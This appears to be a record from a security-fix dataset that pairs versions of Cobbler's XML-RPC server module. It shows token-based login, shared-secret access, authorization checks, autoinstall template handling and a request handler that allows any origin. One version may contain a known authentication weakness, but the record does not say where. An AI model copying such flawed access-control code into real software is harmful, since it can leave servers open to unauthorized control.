profile.COLLECTION_TYPE == \"image\":\n                image_based = True\n                arch = profile.arch\n            else:\n                arch = distro.arch\n\n            if obj.is_management_supported():\n                if not image_based:\n                    _dict[\"pxelinux.cfg\"] = self.tftpgen.write_pxe_file(\n                        None, obj, profile, distro, arch)\n                else:\n                    _dict[\"pxelinux.cfg\"] = self.tftpgen.write_pxe_file(\n                        None, obj, None, None, arch, image=profile)\n\n            return self.xmlrpc_hacks(_dict)\n        return self.xmlrpc_hacks({})\n\n    def get_repo_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get repository after passing through Cobbler's inheritance engine.\n\n        :param name: repository name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a repository.\n        \"\"\"\n\n        self._log(\"get_repo_as_rendered\", name=name, token=token)\n        obj = self.api.find_repo(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_image_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get repository after passing through Cobbler's inheritance engine.\n\n        :param name: image name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as an image.\n        \"\"\"\n\n        self._log(\"get_image_as_rendered\", name=name, token=token)\n        obj = self.api.find_image(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_mgmtclass_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get management class after passing through Cobbler's inheritance engine\n\n        :param name: management class name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a management class.\n        \"\"\"\n\n        self._log(\"get_mgmtclass_as_rendered\", name=name, token=token)\n        obj = self.api.find_mgmtclass(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_package_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get package after passing through Cobbler's inheritance engine\n\n        :param name: package name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a package.\n        \"\"\"\n\n        self._log(\"get_package_as_rendered\", name=name, token=token)\n        obj = self.api.find_package(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_file_as_rendered(self, name: str, token: str = None, **rest):\n        \"\"\"\n        Get file after passing through Cobbler's inheritance engine\n\n        :param name: file name\n        :param token: authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a file.\n        \"\"\"\n\n        self._log(\"get_file_as_rendered\", name=name, token=token)\n        obj = self.api.find_file(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_menu_as_rendered(self, name: str, token: Optional[str] = None, **rest):\n        \"\"\"\n        Get menu after passing through Cobbler's inheritance engine\n\n        :param name: Menu name\n        :param token: Authentication token\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: Get a template rendered as a file.\n        \"\"\"\n\n        self._log(\"get_menu_as_rendered\", name=name, token=token)\n        obj = self.api.find_menu(name=name)\n        if obj is not None:\n            return self.xmlrpc_hacks(utils.blender(self.api, True, obj))\n        return self.xmlrpc_hacks({})\n\n    def get_random_mac(self, virt_type=\"xenpv\", token=None, **rest):\n        \"\"\"\n        Wrapper for ``utils.get_random_mac()``. Used in the webui.\n\n        :param virt_type: The type of the virtual machine.\n        :param token: The API-token obtained via the login() method. Auth token to authenticate against the api.\n        :param rest: This is dropped in this method since it is not needed here.\n        :return: The random mac address which shall be used somewhere else.\n        \"\"\"\n        # ToDo: Remove rest param\n        self._log(\"get_random_mac\", token=None)\n        return utils.get_random_mac(self.api, virt_type)\n\n    def xmlrpc_hacks(self, data):\n        \"\"\"\n        Convert None in XMLRPC to just '~' to make extra sure a client that can't allow_none can deal with this.\n\n        ALSO: a weird hack ensuring that when dicts with integer keys (or other types) are transmitted with string keys.\n\n        :param data: The data to prepare for the XMLRPC response.\n        :return: The converted data.\n        \"\"\"\n        return utils.strip_none(data)\n\n    def get_status(self, mode=\"normal\", token=None, **rest):\n        \"\"\"\n        Returns the same information as `cobbler status`\n        While a read-only operation, this requires a token because it's potentially a fair amount of I/O\n\n        :param mode: How the status should be presented.\n        :param token: The API-token obtained via the login() method. Auth token to authenticate against the api.\n        :param rest: This parameter is currently unused for this method.\n        :return: The human or machine readable status of the status of Cobbler.\n        \"\"\"\n        self.check_access(token, \"sync\")\n        return self.api.status(mode=mode)\n\n    def __get_random(self, length: int) -> str:\n        \"\"\"\n        Get a random string of a desired length.\n\n        :param length: The length of the\n        :return: A random string of the desired length from ``/dev/urandom``.\n        \"\"\"\n        b64 = base64.b64encode(os.urandom(length))\n        return b64.decode()\n\n    def __make_token(self, user: str) -> str:\n        \"\"\"\n        Returns a new random token.\n\n        :param user: The user for which the token should be generated.\n        :return: The token which was generated.\n        \"\"\"\n        b64 = self.__get_random(25)\n        self.token_cache[b64] = (time.time(), user)\n        return b64\n\n    @staticmethod\n    def __is_token(token: str) -> bool:\n        \"\"\"\n        Simple check to validate if it is a token.\n\n        __make_token() uses 25 as the length of bytes that means we need to padding bytes to have a 34 character str.\n        Because base64 specifies that the number of padding bytes are shown via equal characters, we have a 36 character\n        long str in the end in every case.\n\n        :param token: The str which should be checked.\n        :return: True in case the validation succeeds, otherwise False.\n        \"\"\"\n        return isinstance(token, str) and len(token) == 36\n\n    def __invalidate_expired_tokens(self):\n        \"\"\"\n        Deletes any login tokens that might have expired. Also removes expired events.\n        \"\"\"\n        timenow = time.time()\n        for token in list(self.token_cache.keys()):\n            (tokentime, user) = self.token_cache[token]\n            if timenow > tokentime + self.api.settings().auth_token_expiration:\n                self._log(\"expiring token\", token=token, debug=True)\n                del self.token_cache[token]\n        # and also expired objects\n        for oid in list(self.object_cache.keys()):\n            (tokentime, entry) = self.object_cache[oid]\n            if timenow > tokentime + CACHE_TIMEOUT:\n                del self.object_cache[oid]\n        for tid in list(self.events.keys()):\n            (eventtime, name, status, who) = self.events[tid]\n            if timenow > eventtime + EVENT_TIMEOUT:\n                del self.events[tid]\n            # logfile cleanup should be dealt w/ by logrotate\n\n    def __validate_user(self, input_user, input_password):\n        \"\"\"\n        Returns whether this user/pass combo should be given access to the Cobbler read-write API.\n\n        For the system user, this answer is always \"yes\", but it is only valid for the socket interface.\n\n        FIXME: currently looks for users in /etc/cobbler/auth.conf\n        Would be very nice to allow for PAM and/or just Kerberos.\n\n        :param input_user: The user to validate.\n        :param input_password: The password to validate.\n        :return: The return of the operation.\n        \"\"\"\n        return self.api.authenticate(input_user, input_password)\n\n    def __validate_token(self, token: str):\n        \"\"\"\n        Checks to see if an API method can be called when the given token is passed in. Updates the timestamp of the\n        token automatically to prevent the need to repeatedly call login(). Any method that needs access control should\n        call this before doing anything else.\n\n        :param token: The token to validate.\n        :return: True if access is allowed, otherwise False.\n        \"\"\"\n        self.__invalidate_expired_tokens()\n\n        if token in self.token_cache:\n            user = self.get_user_from_token(token)\n            if user == \"<system>\":\n                # system token is only valid over Unix socket\n                return False\n            self.token_cache[token] = (time.time(), user)  # update to prevent timeout\n            return True\n        else:\n            self._log(\"invalid token\", token=token)\n            return False\n\n    def __name_to_object(self, resource, name):\n        if resource.find(\"distro\") != -1:\n            return self.api.find_distro(name)\n        if resource.find(\"profile\") != -1:\n            return self.api.find_profile(name)\n        if resource.find(\"system\") != -1:\n            return self.api.find_system(name)\n        if resource.find(\"repo\") != -1:\n            return self.api.find_repo(name)\n        if resource.find(\"mgmtclass\") != -1:\n            return self.api.find_mgmtclass(name)\n        if resource.find(\"package\") != -1:\n            return self.api.find_package(name)\n        if resource.find(\"file\") != -1:\n            return self.api.find_file(name)\n        if resource.find(\"menu\") != -1:\n            return self.api.find_menu(name)\n        return None\n\n    def check_access_no_fail(self, token, resource, arg1=None, arg2=None) -> bool:\n        \"\"\"\n        This is called by the WUI to decide whether an element is editable or not. It differs form check_access in that\n        it is supposed to /not/ log the access checks (TBA) and does not raise exceptions.\n\n        :param token: The token to check access for.\n        :param resource: The resource for which access shall be checked.\n        :param arg1: Arguments to hand to the authorization provider.\n        :param arg2: Arguments to hand to the authorization provider.\n        :return: True if the object is editable or False otherwise.\n        \"\"\"\n        need_remap = False\n        for x in [\"distro\", \"profile\", \"system\", \"repo\", \"image\", \"mgmtclass\", \"package\", \"file\", \"menu\"]:\n            if arg1 is not None and resource.find(x) != -1:\n                need_remap = True\n                break\n\n        if need_remap:\n            # we're called with an object name, but need an object\n            arg1 = self.__name_to_object(resource, arg1)\n\n        try:\n            self.check_access(token, resource, arg1, arg2)\n            return True\n        except:\n            utils.log_exc()\n            return False\n\n    def check_access(self, token: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        Check if the token which was provided has access.\n\n        :param token: The token to check access for.\n        :param resource: The resource for which access shall be checked.\n        :param arg1: Arguments to hand to the authorization provider.\n        :param arg2: Arguments to hand to the authorization provider.\n        :return: Whether the authentication was successful or not.\n        \"\"\"\n        user = self.get_user_from_token(token)\n        if user == \"<DIRECT>\":\n            self._log(\"CLI Authorized\", debug=True)\n            return True\n        rc = self.api.authorize(user, resource, arg1, arg2)\n        self._log(\"%s authorization result: %s\" % (user, rc), debug=True)\n        if not rc:\n            raise CX(\"authorization failure for user %s\" % user)\n        return rc\n\n    def get_authn_module_name(self, token: str):\n        \"\"\"\n        Get the name of the currently used authentication module.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: The name of the module.\n        \"\"\"\n        user = self.get_user_from_token(token)\n        if user != \"<DIRECT>\":\n            raise CX(\"authorization failure for user %s attempting to access authn module name\" % user)\n        return self.api.get_module_name_from_file(\"authentication\", \"module\")\n\n    def login(self, login_user: str, login_password: str) -> str:\n        \"\"\"\n        Takes a username and password, validates it, and if successful returns a random login token which must be used\n        on subsequent method calls. The token will time out after a set interval if not used. Re-logging in permitted.\n\n        :param login_user: The username which is used to authenticate at Cobbler.\n        :param login_password:  The password which is used to authenticate at Cobbler.\n        :return: The token which can be used further on.\n        \"\"\"\n        # if shared secret access is requested, don't bother hitting the auth plugin\n        if login_user == \"\":\n            if login_password == self.shared_secret:\n                return self.__make_token(\"<DIRECT>\")\n            else:\n                utils.die(\"login failed\")\n\n        # This should not log to disk OR make events as we're going to call it like crazy in CobblerWeb. Just failed\n        # attempts.\n        if self.__validate_user(login_user, login_password):\n            token = self.__make_token(login_user)\n            return token\n        else:\n            utils.die(\"login failed (%s)\" % login_user)\n\n    def logout(self, token: str) -> bool:\n        \"\"\"\n        Retires a token ahead of the timeout.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: if operation was successful or not\n        \"\"\"\n        self._log(\"logout\", token=token)\n        if token in self.token_cache:\n            del self.token_cache[token]\n            return True\n        return False\n\n    def token_check(self, token: str) -> bool:\n        \"\"\"\n        Checks to make sure a token is valid or not.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: if operation was successful or not\n        \"\"\"\n        return self.__validate_token(token)\n\n    def sync_dhcp(self, token: str):\n        \"\"\"\n        Run sync code, which should complete before XMLRPC timeout. We can't do reposync this way. Would be nice to\n        send output over AJAX/other later.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n        self._log(\"sync_dhcp\", token=token)\n        self.check_access(token, \"sync\")\n        self.api.sync_dhcp()\n        return True\n\n    def sync(self, token: str):\n        \"\"\"\n        Run sync code, which should complete before XMLRPC timeout. We can't do reposync this way. Would be nice to\n        send output over AJAX/other later.\n\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n        # FIXME: performance\n        self._log(\"sync\", token=token)\n        self.check_access(token, \"sync\")\n        self.api.sync()\n        return True\n\n    def read_autoinstall_template(self, file_path: str, token: str) -> str:\n        \"\"\"\n        Read an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: file content\n        \"\"\"\n        what = \"read_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        return self.autoinstall_mgr.read_autoinstall_template(file_path)\n\n    def write_autoinstall_template(self, file_path: str, data: str, token: str):\n        \"\"\"\n        Write an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param data: new file content\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: bool if operation was successful\n        \"\"\"\n\n        what = \"write_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.write_autoinstall_template(file_path, data)\n\n        return True\n\n    def remove_autoinstall_template(self, file_path: str, token: str):\n        \"\"\"\n        Remove an automatic OS installation template file\n\n        :param file_path: automatic OS installation template file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: bool if operation was successful\n        \"\"\"\n        what = \"write_autoinstall_template\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.remove_autoinstall_template(file_path)\n\n        return True\n\n    def read_autoinstall_snippet(self, file_path: str, token: str) -> str:\n        \"\"\"\n        Read an automatic OS installation snippet file\n\n        :param file_path: automatic OS installation snippet file path\n        :param token: The API-token obtained via the login() method. Cobbler token, obtained form login()\n        :returns: file content\n        \"\"\"\n        what = \"read_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        return self.autoinstall_mgr.read_autoinstall_snippet(file_path)\n\n    def write_autoinstall_snippet(self, file_path: str, data: str, token: str) -> bool:\n        \"\"\"\n        Write an automatic OS installation snippet file\n\n        :param file_path: automatic OS installation snippet file path\n        :param data: new file content\n        :param token: Cobbler token, obtained form login()\n        :return: if operation was successful\n        \"\"\"\n\n        what = \"write_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.write_autoinstall_snippet(file_path, data)\n\n        return True\n\n    def remove_autoinstall_snippet(self, file_path: str, token: str):\n        \"\"\"\n        Remove an automated OS installation snippet file\n\n        :param file_path: automated OS installation snippet file path\n        :param token: Cobbler token, obtained form login()\n        :return: bool if operation was successful\n        \"\"\"\n\n        what = \"remove_autoinstall_snippet\"\n        self._log(what, name=file_path, token=token)\n        self.check_access(token, what, file_path, True)\n\n        self.autoinstall_mgr.remove_autoinstall_snippet(file_path)\n\n        return True\n\n    def get_config_data(self, hostname: str) -> str:\n        \"\"\"\n        Generate configuration data for the system specified by hostname.\n\n        :param hostname: The hostname for what to get the config data of.\n        :return: The config data as a json for Koan.\n        \"\"\"\n        self._log(\"get_config_data for %s\" % hostname)\n        obj = configgen.ConfigGen(self.api, hostname)\n        return obj.gen_config_data_for_koan()\n\n    def clear_system_logs(self, object_id: str, token: str):\n        \"\"\"\n        clears console logs of a system\n\n        :param object_id: The object id of the system to clear the logs of.\n        :param token: The API-token obtained via the login() method.\n        :return: True if the operation succeeds.\n        \"\"\"\n        obj = self.__get_object(object_id)\n        self.check_access(token, \"clear_system_logs\", obj)\n        self.api.clear_logs(obj)\n        return True\n\n\n# *********************************************************************************\n\n\nclass RequestHandler(SimpleXMLRPCRequestHandler):\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.end_headers()\n\n    # Add these headers to all responses\n    def end_headers(self):\n        self.send_header(\"Access-Control-Allow-Headers\",\n                         \"Origin, X-Requested-With, Content-Type, Accept\")\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        SimpleXMLRPCRequestHandler.end_headers(self)\n\n\nclass CobblerXMLRPCServer(ThreadingMixIn, xmlrpc.server.SimpleXMLRPCServer):\n    \"\"\"\n    This is the class for the main Cobbler XMLRPC Server. This class does not directly contain all XMLRPC methods. It\n    just starts the server.\n    \"\"\"\n\n    def __init__(self, args):\n        \"\"\"\n        The constructor for the main Cobbler XMLRPC server.\n\n        :param args: Arguments which are handed to the Python XMLRPC server.\n        \"\"\"\n        self.allow_reuse_address = True\n        xmlrpc.server.SimpleXMLRPCServer.__init__(self, args, requestHandler=RequestHandler)\n\n\n# *********************************************************************************\n\n\nclass ProxiedXMLRPCInterface:\n\n    def __init__(self, api, proxy_class):\n        \"\"\"\n        This interface allows proxying request through another class.\n\n        :param api: The api object to resolve information with\n        :param proxy_class: The class which proxies the requests.\n        \"\"\"\n        self.proxied = proxy_class(api)\n        self.logger = self.proxied.api.logger\n\n    def _dispatch(self, method, params, **rest):\n        \"\"\"\n        This method magically registers the methods at the XMLRPC interface.\n\n        :param method: The method to register.\n        :param params: The params for the method.\n        :param rest: This gets dropped curently.\n        :return: The result of the method.\n        \"\"\"\n        # ToDo: Drop rest param\n        if method.startswith('_'):\n            raise CX(\"forbidden method\")\n\n        if not hasattr(self.proxied, method):\n            raise CX(\"unknown remote method '%s'\" % method)\n\n        method_handle = getattr(self.proxied, method)\n\n        # FIXME: see if this works without extra boilerplate\n        try:\n            return method_handle(*params)\n        except Exception as e:\n            utils.log_exc()\n            raise e\n", "code_before": "\"\"\"\nCopyright 2007-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport base64\nimport errno\nimport fcntl\nimport keyword\nimport logging\nimport os\nimport random\nimport stat\nimport time\nimport re\nimport xmlrpc.server\nfrom socketserver import ThreadingMixIn\nfrom threading import Thread\nfrom typing import Dict, List, Optional, Union\nfrom xmlrpc.server import SimpleXMLRPCRequestHandler\n\nfrom cobbler import autoinstall_manager\nfrom cobbler import configgen\nfrom cobbler.items import item, package, system, image, profile, repo, mgmtclass, distro, file, menu\nfrom cobbler import tftpgen\nfrom cobbler import utils\nfrom cobbler.cexceptions import CX\nfrom cobbler.validate import validate_autoinstall_script_name, validate_obj_id, validate_obj_name\n\nEVENT_TIMEOUT = 7 * 24 * 60 * 60  # 1 week\nCACHE_TIMEOUT = 10 * 60  # 10 minutes\n\n# task codes\nEVENT_RUNNING = \"running\"\nEVENT_COMPLETE = \"complete\"\nEVENT_FAILED = \"failed\"\n\n# normal events\nEVENT_INFO = \"notification\"\n\n\nclass CobblerThread(Thread):\n    \"\"\"\n    Code for Cobbler's XMLRPC API.\n    \"\"\"\n\n    def __init__(self, event_id, remote, options: dict, task_name: str, api):\n        \"\"\"\n        This constructor creates a Cobbler thread which then may be run by calling ``run()``.\n\n        :param event_id: The event-id which is associated with this thread. Also used as thread name\n        :param remote: The Cobbler remote object to execute actions with.\n        :param options: Additional options which can be passed into the Thread.\n        :param task_name: The high level task name which is used to trigger pre and post task triggers\n        :param api: The Cobbler api object to resolve information with.\n        \"\"\"\n        Thread.__init__(self, name=event_id)\n        self.event_id = event_id\n        self.remote = remote\n        self.logger = logging.getLogger()\n        if options is None:\n            options = {}\n        self.options = options\n        self.task_name = task_name\n        self.api = api\n\n    def on_done(self):\n        \"\"\"\n        This stub is needed to satisfy the Python inheritance chain.\n        \"\"\"\n\n    def run(self):\n        \"\"\"\n        Run the thread.\n\n        :return: The return code of the action. This may possibly a boolean or a Linux return code.\n        \"\"\"\n        time.sleep(1)\n        try:\n            if utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/task/%s/pre/*\" % self.task_name,\n                                  self.options):\n                self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n                return False\n            rc = self._run(self)\n            if rc is not None and not rc:\n                self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n            else:\n                self.remote._set_task_state(self, self.event_id, EVENT_COMPLETE)\n                self.on_done()\n                utils.run_triggers(self.api, None, \"/var/lib/cobbler/triggers/task/%s/post/*\" % self.task_name,\n                                   self.options)\n            return rc\n        except:\n            utils.log_exc()\n            self.remote._set_task_state(self, self.event_id, EVENT_FAILED)\n            return False\n\n\n# *********************************************************************\n\n\nclass CobblerXMLRPCInterface:\n    \"\"\"\n    This is the interface used for all XMLRPC methods, for instance, as used by koan or CobblerWeb.\n\n    Most read-write operations require a token returned from \"login\". Read operations do not.\n    \"\"\"\n\n    def __init__(self, api):\n        \"\"\"\n        Constructor. Requires a Cobbler API handle.\n\n        :param api: The api to use for resolving the required information.\n        \"\"\"\n        self.api = api\n        self.logger = logging.getLogger()\n        self.token_cache: Dict[str, tuple] = {}\n        self.object_cache = {}\n        self.timestamp = self.api.last_modified_time()\n        self.events = {}\n        self.shared_secret = utils.get_shared_secret()\n        random.seed(time.time())\n        self.tftpgen = tftpgen.TFTPGen(api._collection_mgr)\n        self.autoinstall_mgr = autoinstall_manager.AutoInstallationManager(api._collection_mgr)\n\n    def check(self, token: str) -> Union[None, list]:\n        \"\"\"\n        Returns a list of all the messages/warnings that are things that admin may want to correct about the\n        configuration of the Cobbler server. This has nothing to do with \"check_access\" which is an auth/authz function\n        in the XMLRPC API.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: None or a list of things to address.\n        \"\"\"\n        self.check_access(token, \"check\")\n        return self.api.check()\n\n    def background_buildiso(self, options: dict, token: str) -> str:\n        \"\"\"\n        Generates an ISO in /var/www/cobbler/pub that can be used to install profiles without using PXE.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n        webdir = self.api.settings().webdir\n\n        def runner(self):\n            self.remote.api.build_iso(\n                self.options.get(\"iso\", webdir + \"/pub/generated.iso\"),\n                self.options.get(\"profiles\", None),\n                self.options.get(\"systems\", None),\n                self.options.get(\"buildisodir\", None),\n                self.options.get(\"distro\", None),\n                self.options.get(\"standalone\", False),\n                self.options.get(\"airgapped\", False),\n                self.options.get(\"source\", None),\n                self.options.get(\"exclude_dns\", False),\n                self.options.get(\"xorrisofs_opts\", None),\n            )\n\n        def on_done(self):\n            if self.options.get(\"iso\", \"\") == webdir + \"/pub/generated.iso\":\n                msg = \"ISO now available for <A HREF=\\\"/cobbler/pub/generated.iso\\\">download</A>\"\n                self.remote._new_event(msg)\n\n        return self.__start_task(runner, token, \"buildiso\", \"Build Iso\", options, on_done)\n\n    def background_aclsetup(self, options: dict, token: str) -> str:\n        \"\"\"\n        Get the acl configuration from the config and set the acls in the backgroud.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.acl_config(\n                self.options.get(\"adduser\", None),\n                self.options.get(\"addgroup\", None),\n                self.options.get(\"removeuser\", None),\n                self.options.get(\"removegroup\", None),\n            )\n\n        return self.__start_task(runner, token, \"aclsetup\", \"(CLI) ACL Configuration\", options)\n\n    def background_sync(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a full Cobbler sync in the background.\n\n        :param options: Possible options: verbose, dhcp, dns\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            what = []\n            if self.options.get(\"dhcp\", False):\n                what.append('dhcp')\n            if self.options.get(\"dns\", False):\n                what.append('dns')\n            self.remote.api.sync(self.options.get(\"verbose\", False), what=what)\n\n        return self.__start_task(runner, token, \"sync\", \"Sync\", options)\n\n    def background_syncsystems(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a lite Cobbler sync in the background with only systems specified.\n\n        :param options: Unknown what this parameter does.\n        :param token: The API-token obtained via the login() method.\n        :return: The id of the task that was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.sync_systems(self.options.get(\"systems\", []), self.options.get(\"verbose\", False))\n\n        return self.__start_task(runner, token, \"syncsystems\", \"Syncsystems\", options)\n\n    def background_hardlink(self, options: dict, token: str) -> str:\n        \"\"\"\n        Hardlink all files as a background task.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.hardlink()\n\n        return self.__start_task(runner, token, \"hardlink\", \"Hardlink\", options)\n\n    def background_validate_autoinstall_files(self, options: dict, token: str) -> str:\n        \"\"\"\n        Validate all autoinstall files in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            return self.remote.api.validate_autoinstall_files()\n\n        return self.__start_task(runner, token, \"validate_autoinstall_files\", \"Automated installation files validation\",\n                                 options)\n\n    def background_replicate(self, options: dict, token: str) -> str:\n        \"\"\"\n        Replicate Cobbler in the background to another Cobbler instance.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            # FIXME: defaults from settings here should come from views, fix in views.py\n            self.remote.api.replicate(\n                self.options.get(\"master\", None),\n                self.options.get(\"port\", \"\"),\n                self.options.get(\"distro_patterns\", \"\"),\n                self.options.get(\"profile_patterns\", \"\"),\n                self.options.get(\"system_patterns\", \"\"),\n                self.options.get(\"repo_patterns\", \"\"),\n                self.options.get(\"image_patterns\", \"\"),\n                self.options.get(\"mgmtclass_patterns\", \"\"),\n                self.options.get(\"package_patterns\", \"\"),\n                self.options.get(\"file_patterns\", \"\"),\n                self.options.get(\"prune\", False),\n                self.options.get(\"omit_data\", False),\n                self.options.get(\"sync_all\", False),\n                self.options.get(\"use_ssl\", False),\n            )\n\n        return self.__start_task(runner, token, \"replicate\", \"Replicate\", options)\n\n    def background_import(self, options: dict, token: str) -> str:\n        \"\"\"\n        Import an ISO image in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.import_tree(\n                self.options.get(\"path\", None),\n                self.options.get(\"name\", None),\n                self.options.get(\"available_as\", None),\n                self.options.get(\"autoinstall_file\", None),\n                self.options.get(\"rsync_flags\", None),\n                self.options.get(\"arch\", None),\n                self.options.get(\"breed\", None),\n                self.options.get(\"os_version\", None),\n            )\n\n        return self.__start_task(runner, token, \"import\", \"Media import\", options)\n\n    def background_reposync(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a reposync in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            # NOTE: WebUI passes in repos here, CLI passes only:\n            repos = options.get(\"repos\", [])\n            only = options.get(\"only\", None)\n            if only is not None:\n                repos = [only]\n            nofail = options.get(\"nofail\", len(repos) > 0)\n\n            if len(repos) > 0:\n                for name in repos:\n                    self.remote.api.reposync(\n                        tries=self.options.get(\"tries\", 3),\n                        name=name, nofail=nofail)\n            else:\n                self.remote.api.reposync(\n                    tries=self.options.get(\"tries\", 3),\n                    name=None, nofail=nofail)\n\n        return self.__start_task(runner, token, \"reposync\", \"Reposync\", options)\n\n    def background_power_system(self, options: dict, token: str) -> str:\n        \"\"\"\n        Power a system asynchronously in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            for x in self.options.get(\"systems\", []):\n                try:\n                    system_id = self.remote.get_system_handle(x, token)\n                    system = self.remote.__get_object(system_id)\n                    self.remote.api.power_system(system, self.options.get(\"power\", \"\"))\n                except Exception as e:\n                    self.logger.warning(\"failed to execute power task on %s, exception: %s\" % (str(x), str(e)))\n\n        self.check_access(token, \"power_system\")\n        return self.__start_task(runner, token, \"power\", \"Power management (%s)\" % options.get(\"power\", \"\"), options)\n\n    def power_system(self, system_id: str, power: str, token: str) -> bool:\n        \"\"\"Execute power task synchronously.\n\n        Returns true if the operation succeeded or if the system is powered on (in case of status).\n        False otherwise.\n\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method. All\n                      tasks require tokens.\n        :param system_id: system handle\n        :param power: power operation (on/off/status/reboot)\n        \"\"\"\n        system = self.__get_object(system_id)\n        self.check_access(token, \"power_system\", system)\n        result = self.api.power_system(system, power)\n        return True if result is None else result\n\n    def background_signature_update(self, options: dict, token: str) -> str:\n        \"\"\"\n        Run a signature update in the background.\n\n        :param options: Not known what this parameter does.\n        :param token: The API-token obtained via the login() method. The API-token obtained via the login() method.\n        :return: The id of the task which was started.\n        \"\"\"\n\n        def runner(self):\n            self.remote.api.signature_update()\n\n        self.check_access(token, \"sigupdate\")\n        return self.__start_task(runner, token, \"sigupdate\", \"Updating Signatures\", options)\n\n    def background_mkgrub(self, options, token) -> str:\n        def runner(self):\n            return self.api.create_grub_images()\n\n        return self.__start_task(\n            runner, token, \"create_grub_images\", \"Create bootable GRUB images\", options\n        )\n\n    def get_events(self, for_user: str = \"\") -> dict:\n        \"\"\"\n        Returns a dict(key=event id) = [ statetime, name, state, 